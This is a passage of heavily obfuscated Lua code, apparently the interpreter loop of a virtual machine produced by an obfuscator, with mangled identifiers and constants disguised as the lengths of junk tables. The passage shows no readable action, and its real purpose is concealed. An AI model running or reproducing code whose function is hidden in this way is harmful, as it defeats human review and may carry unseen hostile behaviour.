111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kQ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("MBF")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nr")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EaU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fe")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("VUR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2t")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Ivp")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{979;356;444;332};{920;671;137;192};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{732;596;598;880};"1 + 1 = 111";{237;832;827;949};{194;447;481;445};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tD")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("7sT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("EN8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("UWff")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y9")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xS7")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S0Ia")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gx")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L4d")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("G0eP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lvK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cN37")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3D")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QTj")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("EHSy")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Eb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{395;370;273;477};{468;672;365;816};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("xBQ3")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vr")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("57u")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6W")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L5Q")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C60Q")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kb")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rda")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5K")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("cpk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ut")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{343;575;819;80};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VQP1")]];else ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sz1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wz")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{384;317;151;920};"1 + 1 = 111";{722;88;33;2};{660;121;813;678};"1 + 1 = 111";"1 + 1 = 111";{332;935;17;65};{270;996;380;513};}then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6v")]]<ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qdau")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("y6a")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll==#{{866;987;443;800};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{134;25;345;560};"1 + 1 = 111";"1 + 1 = 111";{509;858;194;706};{448;989;578;132};"1 + 1 = 111";{136;646;445;240};{387;578;542;157};{354;526;253;111};}then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("JH")];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl>ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("jQ7")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl<ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("HYI")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("IZ")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xy1")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vq0B")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("O8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oVk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("yN")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("uTY")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Igq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iuhn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cF")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("sD1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("on")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gGk")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ndRG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ql")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Bj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{847;957;262;414};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qjOY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("RVQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ySz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{494;361;158;955};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Mm")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("nUE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Jz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("hKR")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v7cS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("m6")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{996;721;195;96};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{512;738;7;56};{178;65;720;764};"1 + 1 = 111";}]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AGy0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LX")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mlV")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("MU")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Ljb")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zR")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zKT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fLp5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sr")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("B10")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dst")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{193;318;158;686};"1 + 1 = 111";{140;349;506;941};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qh")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("cGH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wh")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UgL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S8j1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{387;891;422;468};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tpq")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gzms")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AD")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("DZl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v3rB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("6M6")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";{720;902;356;314};{848;22;955;122};"1 + 1 = 111";{509;284;853;789};"1 + 1 = 111";{274;510;416;145};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{397;287;261;375};{499;237;80;46};"1 + 1 = 111";"1 + 1 = 111";}then if ajefa_IIIlIllIllllIIllIlllIIll<=#("eobUUG6mFDeNZsS5")then ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{622;441;9;828};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mc")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{993;402;210;407};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{826;97;530;733};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{51;208;306;308};{796;987;79;184};{594;528;826;928};"1 + 1 = 111";{805;783;247;906};}then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5P")]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("14M")]];else local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("1a")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("krzT")];local ajefa_IlIIllIIIl=ajefa_lIIllIlIIlllII+2 local ajefa_lIIllIlIIlllII={ajefa_lIlllIll[ajefa_lIIllIlIIlllII](ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1],ajefa_lIlllIll[ajefa_IlIIllIIIl])};for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IIIlIllIllllIIllIlllIIll do ajefa_lIlllIll[ajefa_IlIIllIIIl+ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll];end;local ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII[1]if ajefa_lIIllIlIIlllII then ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIIllIlIIlllII ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("23a")];else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("YfIenxXhFE4Gd0J5mtO")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("r4")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])elseif ajefa_IIIlIllIllllIIllIlllIIll>#("4Zy8KgyKECncXu40FG9k")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("k1")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5X")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RP1s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("OBc")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("AC")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("JNy")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sct")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("P4SU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kY")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("UxBP")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("POO")];end;else local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0B")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("vpO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("ym")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o9E")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xYkV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;aje